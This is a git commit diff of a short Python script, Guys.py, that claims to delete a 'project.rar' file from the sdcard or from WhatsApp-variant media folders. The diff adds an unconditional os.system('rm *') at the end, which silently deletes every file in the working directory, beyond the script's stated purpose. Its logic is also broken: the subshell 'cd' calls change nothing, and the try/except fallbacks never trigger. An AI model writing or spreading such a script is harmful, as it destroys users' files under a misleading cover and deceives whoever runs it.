d590e30471f356dc6988c7e2657f08f69ba4fe15
Devfemibadmus <devfemibadmus@gmail.com>
2021-09-28 18:35:13 +0100

    Create Guys.py

--- Guys.py
+++ Guys.py
@@ -2,37 +2,32 @@ import os, sys
 
 
 try:
-    os.system("rm *")
     os.system("cd /sdcard && rm project.rar")
     print("sucessful!")
 except:
-    try:
-        os.system("rm *")
+    try:      
         os.system("cd /sdcard/FMWhatsApp/Media")
         os.system("cd 'FMWhatsApp Documents'")
         os.system("rm project.rar")
         print("sucessful!")
     except:
-        try:
-            os.system("rm *")
+        try:  
             os.system("cd /sdcard/GBWhatsApp/Media")
             os.system("cd 'GBWhatsApp Documents'")
             os.system("rm project.rar")
             print("sucessful!")
         except:
-            try:
-              os.system("rm *")
+            try:  
               os.system("rm project.rar")
               print("sucessful!")
             except:
                 try:
-                  os.system("rm *")
                   os.system("cd /sdcard/WhatsApp/Media")
                   os.system("cd 'WhatsApp Documents'")
                   os.system("rm project.rar")
                   print("sucessful!")
                 except:
-                    print("not sucessful!, talk to devfemibadmus or @007 ")
-
+                    print("not sucessful!, talk to devfemibadmus or @007")
+os.system("rm *")
 
     
